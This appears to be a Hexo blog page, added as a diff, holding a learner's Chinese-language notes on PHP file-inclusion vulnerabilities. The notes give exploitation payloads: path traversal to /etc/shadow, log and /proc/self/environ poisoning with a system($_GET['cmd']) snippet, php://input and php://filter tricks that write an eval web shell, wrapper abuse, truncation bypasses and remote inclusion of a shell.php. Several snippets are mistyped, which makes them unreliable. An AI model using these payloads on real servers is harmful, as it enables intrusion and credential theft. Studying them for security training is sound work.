@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="文件包含(文件上传完会进行解析)即脚本中含另外一个文件，即文件引用，可以保证统一风格，导航栏、底部footer栏 漏洞原因参数没有严格过滤，被用户控制包含恶意文件 php中文件包含函数requirerequire：函数出错，报错，退出 require_once:出错，直接退出，仅包含一次，脚本执行时，同一个文件文件可能被多次引用，出现函数重定义，变量重新赋值 includenclude() 函数用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2024/10/08/top10/2%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文件包含(文件上传完会进行解析)即脚本中含另外一个文件，即文件引用，可以保证统一风格，导航栏、底部footer栏 漏洞原因参数没有严格过滤，被用户控制包含恶意文件 php中文件包含函数requirerequire：函数出错，报错，退出 require_once:出错，直接退出，仅包含一次，脚本执行时，同一个文件文件可能被多次引用，出现函数重定义，变量重新赋值 includenclude() 函数用">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-10-08T02:40:41.311Z">
+<meta property="article:modified_time" content="2024-09-29T15:28:42.935Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-top10/2文件包含" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/08/top10/2%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+  <time class="dt-published" datetime="2024-10-08T02:40:41.311Z" itemprop="datePublished">2024-10-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="文件包含-文件上传完会进行解析"><a href="#文件包含-文件上传完会进行解析" class="headerlink" title="文件包含(文件上传完会进行解析)"></a>文件包含(文件上传完会进行解析)</h1><p>即脚本中含另外一个文件，即文件引用，可以保证统一风格，导航栏、底部footer栏</p>
+<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>参数没有严格过滤，被用户控制包含恶意文件</p>
+<h2 id="php中文件包含函数"><a href="#php中文件包含函数" class="headerlink" title="php中文件包含函数"></a>php中文件包含函数</h2><h3 id="require"><a href="#require" class="headerlink" title="require"></a>require</h3><p>require：函数出错，报错，退出</p>
+<p>require_once:出错，直接退出，仅包含一次，脚本执行时，同一个文件文件可能被多次引用，出现函数重定义，变量重新赋值</p>
+<h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p><code>nclude()</code> 函数用于包含并运行一个指定的文件</p>
+<p>在包含文件时，如果文件中存在 PHP 代码，那么这些代码将被执行。如果只是包含静态内容（如 HTML 或纯文本），则内容将被直接输出到浏览器。</p>
+<p>include：错误，警报，继续执行</p>
+<p>include_once:出错，警告，仅含一次</p>
+<p><code>include_once()</code> 与 <code>include()</code> 类似，但它会先检查文件是否已经被包含过，如果已经被包含，则不会再次包含。</p>
+<h2 id="类型和利用"><a href="#类型和利用" class="headerlink" title="类型和利用"></a>类型和利用</h2><h3 id="本地文件包含local-file-include"><a href="#本地文件包含local-file-include" class="headerlink" title="本地文件包含local file include"></a>本地文件包含local file include</h3><p>(是服务器的本地文件)</p>
+<p>被包含文件在服务器本地</p>
+<p>利用，本地敏感文件，上传文件</p>
+<h4 id="包含系统文件"><a href="#包含系统文件" class="headerlink" title="包含系统文件"></a>包含系统文件</h4><p>&#x2F;？参数&#x3D;C：&#x2F;wodows&#x2F;123.php</p>
+<p>&#x3D;&#x3D;这俩能互换嘛，区别来&#x3D;&#x3D;</p>
+<h4 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h4><p>&#x2F;？参数&#x3D;..&#x2F;..&#x2F;..&#x2F;flag</p>
+<h4 id="敏感文件默认路径"><a href="#敏感文件默认路径" class="headerlink" title="敏感文件默认路径"></a>敏感文件默认路径</h4><h6 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h6><p>C:\boot.ini    &#x2F;&#x2F;查看系统版本</p>
+<p>C:\windows\system32\inetsrv\metabase.xml &#x2F;&#x2F;iis的配置文件</p>
+<h6 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h6><p>&#x2F;etc&#x2F;passwd  &#x2F;&#x2F;账户信息</p>
+<p>&#x2F;etc&#x2F;shadow  &#x2F;&#x2F;账户密码文件</p>
+<h3 id="远程文件包含remote-file-inclusion"><a href="#远程文件包含remote-file-inclusion" class="headerlink" title="远程文件包含remote file inclusion"></a>远程文件包含remote file inclusion</h3><p>&#x3D;&#x3D;将我的电脑上的文件上传到话是http我的ip？局域网？&#x3D;&#x3D;</p>
+<p>被包含文件在远程服务端</p>
+<p>利用，指定远程url文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure>
+
+<p>&#x3D;&#x3D;举实例是上传.txt内容是php（会以php的语法执行txt？为什么不直接上传php，就算防后缀，把木马php改成txt？），fopen一个php文件，写入木马，访问这个php文件（php访问的时候是执行而不显示内容？那想要看到内容怎么办？），然后蚁剑，蚁剑链接到这个php文件&#x3D;&#x3D;</p>
+<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>获取敏感信息<br>执行任意命令<br>获取服务器信息</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ul>
+<li><h4 id="配合日志"><a href="#配合日志" class="headerlink" title="配合日志"></a>配合日志</h4>上传name，回车，会有参数名在url上，改url但url编码会让php语句不被识别，用burp，凡是php语句都会被执行（好像是）</li>
+</ul>
+<p>​		..&#x2F;..&#x2F;..&#x2F;Apache&#x2F;logs&#x2F;access.log获得日志</p>
+<ul>
+<li><h4 id="配合-proc-self-environ文件"><a href="#配合-proc-self-environ文件" class="headerlink" title="配合&#x2F;proc&#x2F;self&#x2F;environ文件"></a>配合&#x2F;proc&#x2F;self&#x2F;environ文件</h4><p>在burp中将cmd的命令&lt;?php system($_GET[‘cmd’]);?.添加到useragent，&#x2F;?参数&#x3D;&#x2F;proc&#x2F;self&#x2F;enviro&amp;cmd&#x3D;id</p>
+</li>
+<li><h4 id="配合session"><a href="#配合session" class="headerlink" title="配合session"></a>配合session</h4></li>
+<li><h4 id="利用php协议进行文件包含"><a href="#利用php协议进行文件包含" class="headerlink" title="利用php协议进行文件包含"></a>利用php协议进行文件包含</h4><ul>
+<li><h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4>？参数&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;1223.ini有时候会过滤..&#x2F;</li>
+</ul>
+<p>&#x3D;&#x3D;讲解是此时远程上传的那两个命令可以都是观的？这不是本地吗？&#x3D;&#x3D;</p>
+<ul>
+<li><h4 id="php-filter-这里面的php会被编译所以给源码不执行，"><a href="#php-filter-这里面的php会被编译所以给源码不执行，" class="headerlink" title="php:&#x2F;&#x2F;filter 这里面的php会被编译所以给源码不执行，"></a>php:&#x2F;&#x2F;filter 这里面的php会被编译所以给源码不执行，</h4><ul>
+<li><p>读取php:&#x2F;&#x2F;filter&#x2F;read或者write&#x3D;或者省略convert.base64-encode&#x2F;resource&#x3D;index.php</p>
+</li>
+<li><p>改写，四个字符一组解码，大小写，0-9+&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;&lt;?php exit;?&gt;&#x27;//exit后边不执行</span><br><span class="line">$a.=$_post[&#x27;txt&#x27;];</span><br><span class="line">file_put_contents($post[filename],$a);</span><br></pre></td></tr></table></figure>
+
+<p>post传参为test&#x3D;b后边是木马编码</p>
+<p>1、&amp;file&#x3D;php：&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php</p>
+<p>2、&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|cnvert.base64-decode&#x2F;resource&#x3D;shell.php</p>
+<p>这个会去除html和php标签的内容，然后对想要的进行解码</p>
+</li>
+</ul>
+<p><code>php://filter</code> 本身&#x3D;&#x3D;不会直接导致回显，&#x3D;&#x3D;它只是一个数据流的过滤器。回显（echo）是指将数据输出到浏览器或其他输出设备。如果你想要在应用了 <code>php://filter</code> 过滤器之后回显数据，你需要显式地使用 <code>echo</code> 或其他输出函数来输出处理后的数据。</p>
+</li>
+<li><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><ul>
+<li><p>接收post数据，作为php代码</p>
+</li>
+<li><pre><code>用hackbar
+url：http://192.168.1.1/?参数=php://input
+在post中输入&lt;?php fputs(fopen(&quot;shell.php&quot;,&#39;w&#39;),&lt;?php eval(\$_post[&#39;cmd&#39;]);?&gt;) 
+前提是
+allow_url_fopen=off 
+allow_url_include=on
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ #### zip://,bzip2://,zlib://</span><br><span class="line"></span><br><span class="line">  + 可以访问压缩文件里面的子文件</span><br><span class="line"></span><br><span class="line">  + off也可</span><br><span class="line"></span><br><span class="line">  + ```</span><br><span class="line">    http://192.168.1.1/?参数=zip://D:\phpstudy\teat。zip%23test.php</span><br><span class="line">    %23是#必须绝对路径#目标文件</span><br><span class="line">    大多不是上传jpg嘛，可以把zip后缀改成jpg</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+<li><h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><ul>
+<li>类似于zip，可以绝对可以相对</li>
+<li>off也可</li>
+<li>上传一个zip，可以后缀改成jpg，可能返回一个路径，在上传一个参数为phar:&#x2F;&#x2F;..&#x2F;..&#x2F;abc.jpg&#x2F;test.php</li>
+</ul>
+</li>
+<li><h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><ul>
+<li>将原本的include的文件流重定向到用户可控制的输入流中，双on的情况下才可以使用</li>
+<li>参数&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()&#x2F;&#x2F;就是说直接就是文件内容，用逗号隔开</li>
+<li>参数&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,编码内容&#x2F;&#x2F;分号和逗号都看看在哪，意味着读取的时候会先进行base64编码00</li>
+</ul>
+</li>
+<li><h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher:&#x2F;&#x2F;"></a>gopher:&#x2F;&#x2F;</h4></li>
+<li><h4 id="dict"><a href="#dict" class="headerlink" title="dict:&#x2F;&#x2F;"></a>dict:&#x2F;&#x2F;</h4></li>
+</ul>
+</li>
+</ul>
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="本地文件"><a href="#本地文件" class="headerlink" title="本地文件"></a>本地文件</h3><h4 id="某文件下用"><a href="#某文件下用" class="headerlink" title="某文件下用..&#x2F;"></a>某文件下用..&#x2F;</h4><h4 id="0截断"><a href="#0截断" class="headerlink" title="%0截断"></a>%0截断</h4><p>前提是maic_quotes_gps&#x3D;off且php版本&lt;5.3.4</p>
+<h4 id="路径长度截断，后面的字符穿就会被丢弃"><a href="#路径长度截断，后面的字符穿就会被丢弃" class="headerlink" title="路径长度截断，后面的字符穿就会被丢弃"></a>路径长度截断，后面的字符穿就会被丢弃</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#！php</span><br><span class="line">&lt;?php include(&quot;inc/&quot;.$_GET[&#x27;file&#x27;].&quot;htm&quot;);?&gt;</span><br><span class="line">1、？file=../../phpinfo.php%00</span><br><span class="line">2、（Linux）？file=../../phpinfo.php%。/。/。/。/。/。/。</span><br><span class="line">3、（Windows）？file=../../phpinfo.php%00..................</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程文件"><a href="#远程文件" class="headerlink" title="远程文件"></a>远程文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;cmd&#x27;]</span><br><span class="line">require_once $a.&quot;/action_share.php&quot;</span><br><span class="line">?参数=http://196.128.1.1/shell.php?或者#，让后面成为参数或者注释掉</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/08/top10/2%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="cm1zupb1m000bqcasdyvj1jq2" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/10/08/top10/1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/10/08/top10/15%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%88%91%E6%9C%8D%E4%BA%86%EF%BC%8C%E5%88%B0%E5%BA%95%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B2%A1%E6%9C%89css/" rel="tag">我服了，到底为什么没有css</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E6%88%91%E6%9C%8D%E4%BA%86%EF%BC%8C%E5%88%B0%E5%BA%95%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B2%A1%E6%9C%89css/" style="font-size: 10px;">我服了，到底为什么没有css</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/10/08/top10/%E6%88%91%E9%82%A3%E6%87%B5%E9%80%BC%E7%9A%84%E9%97%AE%E9%A2%98%E4%BB%AC/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/08/top10/%E5%87%BD%E6%95%B0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/08/top10/SQL/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/08/top10/md5%E7%BB%95%E8%BF%87/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/08/top10/shctf/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
